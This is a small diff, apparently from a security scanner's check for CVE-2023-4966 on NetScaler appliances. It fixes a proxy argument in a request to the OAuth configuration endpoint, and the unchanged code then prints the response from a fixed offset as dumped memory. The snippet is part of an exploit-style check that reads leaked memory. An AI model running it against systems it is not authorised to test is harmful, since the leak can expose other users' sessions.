@@ -22,7 +22,7 @@ class Cve_2023_4966:
         OutPrintInfo("NetScaler", "开始检测CVE-2023-4966...")
         try:
             url = f"{hostname}/oauth/idp/.well-known/openid-configuration"
-            r = requests.get(url, headers=headers, verify=ssl,proxies=proxies,timeout=10)
+            r = requests.get(url, headers=headers, verify=ssl,proxies=proxy,timeout=10)
             if r.status_code == 200:
                 OutPrintInfo("NetScaler", "--- Dumped Memory ---")
                 OutPrintInfo("NetScaler", r.text[131050:])
